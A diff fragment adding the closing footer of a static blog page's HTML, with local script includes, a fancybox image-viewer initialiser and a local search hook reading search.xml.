+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
